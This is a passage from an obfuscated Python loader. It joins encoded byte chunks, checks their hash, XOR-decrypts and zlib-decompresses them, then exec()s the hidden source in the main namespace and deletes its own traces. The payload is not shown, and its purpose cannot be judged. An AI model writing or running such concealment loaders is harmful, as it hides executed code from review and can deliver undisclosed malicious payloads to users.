_cfpm0sd0rPPZzU + _cmV5fzIgAbkB3W + _cmH27jreYI9ze1 + _chgKCwgfFKC2lH + _c_Hqn9Wwmss203 + _cdCGoTzMED9cJO + _cqVF2i2iBRRAfr + _cm9sEKndu92EMR + _cmDvPqBxYjxsNB + _cyKnk0rMXmdrue + _ccIkMr9oEMrDVy + _cewYG8jw0C9uDd + _cwxKY51ua4f6fA + _cp5W2ZD9SSirHk + _ccTJOBF1wfxCIZ + _cvDABum4xpe4s8 + _cz_ec4CFn62k5e + _cqGhAumz0iMpdb + _cc8XlYNWQsSJdT + _cxZrME_EeswiW5 + _cwpGIFXgQ_aNJd + _cxfAy20sOdeuJh + _cmiIsk_66stHxX + _cxViv1Kq1A_tnd + _crD4Ykm0IcPooE + _co2RA48_JCTTFU + _cj1vpgrI5lvouF + _c_GSlS2xp2tRGx + _cs3XjAdN7ZTUNq + _cwOqPDwJxkhfV6 + _cuPYNSnT7Xg5Za + _cbW4LVF1A6Dyrc + _cmULLmNAgzfeNu + _cweVQ0C6TPDMjR + _cn68iIxP8wTpfM + _cbzqjpY18iCpC9 + _cdDBfq_B21swut + _ctU508PKmekDav + _cqCB5rhR6RQVOi + _ca8CJjpqJSCT0Q + _chxMF2M88ifSV5 + _ciqJtQ1A91j4xg + _cvkWuX6FdzZ1Fh + _ca_oNgQmVlj82t + _ctzq3P87iytIQA + _ckzYXFgJUQZGXr + _cxh308cl_k2g0D + _cmxvIwUKtPZifm + _cwMFxDfObRXnc0 + _ceZACuxjhv6mk6 + _cp8qKN1uh02_JY + _cze47ylDq6tfh3 + _cla1LCSPqxJ_0a + _claz7HrRd0Fr5U + _chTrHRjqIxEnyG + _cdOTu2CVvkI6UC + _cbXglQ5IqmZQUa + _cgS9m2Y7BefnDS + _ckS_xFXtqNjEGR + _cno69XNxxFSbvl + _chAs9HDcLfVVMx + _cwdpPM70NQ0yHY + _cpfpCIVk3OH3vs + _cy2M03d_2n9WvU + _cwHz_4EMPs6K91 + _cpcZmHPF4cV2Kf + _cjt_FE08YdXYCn + _crPtYCUuKzt6si + _czwWmtFkDcZOcd + _ca0_zvmuYXtlbU + _clruOsmQxLCy_p + _cnv3t0gAHvdV6s + _cnMuztjB8Cqr_t + _ctnyhHywWc87xL + _cqX4r95qq5XHGH + _cfufnY_P7Nzkrj + _cs0BwtPhQOPmBb + _cwmBHZzgsnb78q + _cgdv9jPljmPeXA + _caq1Etdto2kdf7 + _cv1k8JVlFIE7Mx + _cr6gxSNMAIvz0S + _ceRMF1G_vqQkRi + _cr08qGDQlmCW4L + _curRIuuHaoHQlU + _chMIwKC27apZ91 + _ceC8wpZwlmXV0w + _czhY9h2UdW0oLv + _ccvkGCNZygc9Pm + _cjfyLMkIOS29I4 + _cae8ejkkUPsn5d + _cn1KOx2dvqGVK6 + _ceKrttZD91vJgH + _cw67gN_5Uurv9m + _chhWeqH4wopm1O + _chiQxoP6aPp9ID + _cnsIAOj1apbtql + _crGdxJALcrG4Et + _cgydO0eNCtTSvg + _cx0PFiDykVS7JU + _cm4hPkKYlzPZpn + _cc822gDYFQog7I + _cw9uzs8k51sfOB + _cf7UylOENzXVym + _cj0qXjm7M7Zdq8 + _cly9lq0TqMUF9B + _cyGohFGGqRH_sY + _cv_6jZItNtpc5x + _cqqnT7iC7Mfl5y + _cgZjzn5th2Nj1I + _coib9QsMVCRa_T + _cevTMvkN5e4sHE + _csw2_x6m9vdB_9 + _chhh6TS51yAYRt + _cntS9QfAz8jxq9 + _cdnLwITBpwEWja + _czZL0BVtvvMbBw)
if __import__('hashlib').sha256(_pjh2a_Vf2oTZk7).hexdigest() != '490a2a5eb1eda8a508be9de1ba248c2bd6253da18b79bf710c630f6249ae45bd':
    __import__('sys').exit(1)
_xtsHaKLHq_kfEs = bytes([95, 120, 243, 248, 248, 155, 185, 172, 173, 139, 178, 17, 234, 147, 56, 102, 81, 137, 177, 15, 26, 141, 248, 184, 232, 61, 243, 140, 24, 154, 39, 61])
_fkk2MyWNAmp2BFl = bytes([49, 122, 138, 116, 165, 26, 254, 28, 117, 163, 233, 250, 231, 231, 50, 177, 233, 164, 227, 89, 46, 58, 52, 247, 219, 241, 77, 124, 87, 126, 241, 15])

def _fxogfJi2LcBfgTy(_bzpKMBXelHTXak, _kj9GGMJF53PeCc):
    return bytes(_bzpKMBXelHTXak[_iql0DH_7EQmSbz] ^ _kj9GGMJF53PeCc[_iql0DH_7EQmSbz % len(_kj9GGMJF53PeCc)] for _iql0DH_7EQmSbz in range(len(_bzpKMBXelHTXak)))

def _fdrepGwyXzojoLA(_tsg08VJ4u56lFn):
    import zlib
    return zlib.decompress(_tsg08VJ4u56lFn) # Un seul niveau de zlib ici pour simplifier

def _feeYzQBId_fHv11():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xrCs6bCu7QxYIg = _fxogfJi2LcBfgTy(_pjh2a_Vf2oTZk7, _xtsHaKLHq_kfEs)
    # 2. Décompression Zlib
    _dq4kjCBYy9WipD = _fdrepGwyXzojoLA(_xrCs6bCu7QxYIg)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dq4kjCBYy9WipD.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ngDVOK3S6ZGgSq = _main.__dict__
    _ngDVOK3S6ZGgSq.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ngDVOK3S6ZGgSq)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feeYzQBId_fHv11()
try:
    del _fxogfJi2LcBfgTy, _fdrepGwyXzojoLA, _feeYzQBId_fHv11
    del _pjh2a_Vf2oTZk7, _xtsHaKLHq_kfEs, _fkk2MyWNAmp2BFl
except:
    pass
